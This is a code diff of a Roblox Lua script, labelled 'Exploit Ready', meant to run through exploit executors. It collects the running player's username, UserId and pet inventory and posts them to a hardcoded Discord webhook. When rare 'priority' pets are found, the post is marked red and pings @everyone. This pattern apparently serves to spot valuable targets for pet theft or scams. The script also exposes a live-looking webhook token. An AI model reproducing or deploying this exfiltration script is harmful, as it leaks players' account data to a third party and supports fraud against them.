@@ -1,85 +1,140 @@
--- In-Game Inventory → Discord Webhook (No Accessories)
--- Works in Studio (HttpService enabled) and most executors (http_request/syn.request)
+-- In-Game Pet Inventory → Discord Webhook (Exploit Ready)
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
 
--- ========= CONFIG =========
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU" -- <- your webhook
--- =========================
+-- === CONFIG ===
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
+-- ==============
 
-local player = Players.LocalPlayer
+-- Priority pets (always go on top + ping everyone if found)
+local PRIORITY = {
+    "Raccoon",
+    "Dragonfly",
+    "Mimic Octopus",
+    "Red Fox",
+    "Disco Bee",
+    "Queen Bee",
+    "Lobster Thermidor",
+    "Golden Goose"
+}
 
--- Utility: collect Tool names from a container (Backpack, StarterGear, Character)
-local function collectTools(container)
+-- Allowed pets
+local PETS = {
+    "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
+    "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
+    "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
+    "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
+    "Blood Kiwi","Blood Hedgehog","Moon Cat","Petal Bee","Tarantula Hawk","Moth","Ostrich",
+    "Peacock","Capybara","Scarlet Macaw","Meerkat","Sand Snake","Bald Eagle","Raptor",
+    "Triceratops","Pterodactyl","Stegosaurus","Parasaurolophus","Iguanodon","Pachycephalosaurus",
+    "Tanuki","Tanchozuru","Kodama","Corrupted Kodama","Sushi Bear","Hotdog Daschund","Seedling",
+    "Snail","Giant Ant","Caterpillar","Brown Mouse","Squirrel","Praying Mantis","Echo Frog",
+    "Chicken Zombie","Night Owl","Red Giant Ant","Cooked Owl","Butterfly","Mimic Octopus",
+    "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
+    "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
+    "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose"
+}
+
+-- Lowercased keywords for detection
+local PET_KEYWORDS = {}
+for _, name in ipairs(PETS) do
+    PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower()
+end
+
+-- Helper: check if name contains any keyword
+local function isPet(name)
+    local lower = name:lower()
+    for _, keyword in ipairs(PET_KEYWORDS) do
+        if string.find(lower, keyword) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Collect pets from a container
+local function collectPets(container)
     local items = {}
     if not container then return items end
     for _, obj in ipairs(container:GetChildren()) do
-        if obj:IsA("Tool") then
+        if obj:IsA("Tool") and isPet(obj.Name) then
             table.insert(items, obj.Name)
         end
     end
-    table.sort(items, function(a,b) return a:lower() < b:lower() end)
-    return items
+
+    -- Priority vs normal
+    local priorityItems, normalItems = {}, {}
+    for _, name in ipairs(items) do
+        local isPriority = false
+        for _, p in ipairs(PRIORITY) do
+            if string.find(name:lower(), p:lower()) then
+                isPriority = true
+                break
+            end
+        end
+        if isPriority then
+            table.insert(priorityItems, name)
+        else
+            table.insert(normalItems, name)
+        end
+    end
+
+    table.sort(priorityItems, function(a,b) return a:lower()<b:lower() end)
+    table.sort(normalItems, function(a,b) return a:lower()<b:lower() end)
+
+    local ordered = {}
+    for _,n in ipairs(priorityItems) do table.insert(ordered,n) end
+    for _,n in ipairs(normalItems) do table.insert(ordered,n) end
+
+    return ordered, #priorityItems > 0
 end
 
--- Snapshot current inventory
-local backpackTools   = collectTools(player and player:FindFirstChild("Backpack"))
-local starterGear     = collectTools(player and player:FindFirstChild("StarterGear"))
-local equippedTools   = collectTools(player and player.Character)
+-- Collect from Backpack + Equipped
+local backpack, hasPriorityBackpack = collectPets(player:FindFirstChild("Backpack"))
+local equipped, hasPriorityEquipped = collectPets(player.Character)
 
--- Build readable sections
-local function section(label, list)
-    return "**" .. label .. ":** " .. (#list > 0 and table.concat(list, ", ") or "None")
+-- Format section
+local function section(name, list)
+    if #list == 0 then
+        return "**" .. name .. ":**\nNo pets found."
+    else
+        return "**" .. name .. ":**\n" .. table.concat(list, "\n")
+    end
 end
 
+-- Build Discord embed
 local description = table.concat({
     "Username: " .. player.Name,
     "UserId: " .. player.UserId,
     "",
-    section("Backpack", backpackTools),
-    section("StarterGear", starterGear),
-    section("Equipped Tools", equippedTools),
-}, "\n")
+    section("Backpack Pets", backpack),
+    section("Equipped Pets", equipped),
+}, "\n\n")
+
+-- Check if any priority pet exists in backpack or equipped
+local hasPriority = hasPriorityBackpack or hasPriorityEquipped
+local ping = hasPriority and "@everyone" or ""
 
 local payload = {
-    content = "**In-Game Inventory Log**",
+    content = ping .. " **Pet Inventory Log**",
     embeds = {{
-        title = "Inventory Snapshot",
+        title = "Pet Snapshot",
         description = description,
-        color = 3447003
+        color = hasPriority and 15158332 or 3447003 -- red if priority pet, blue otherwise
     }}
 }
 
-local jsonBody = HttpService:JSONEncode(payload)
+local json = game:GetService("HttpService"):JSONEncode(payload)
 
--- Sender that tries HttpService first, then common executor request funcs
-local function sendWebhook(json)
-    -- Try HttpService (Studio / your game with HTTP enabled)
-    local ok = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
-    end)
-    if ok then return true end
-
-    -- Fallback for executors
-    local req = rawget(getfenv(), "http_request")
-              or rawget(getfenv(), "request")
-              or (syn and syn.request)
-              or (fluxus and fluxus.request)
-              or (krnl and krnl.request)
-
-    if req then
-        local res = req({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = json
-        })
-        return true
-    else
-        warn("[Inventory Webhook] No HTTP available. Enable HttpService or use an executor with http_request.")
-        return false
-    end
+-- Send webhook
+local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+if req then
+    req({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json
+    })
+else
+    warn("❌ Your executor does not support HTTP requests.")
 end
-
-sendWebhook(jsonBody)
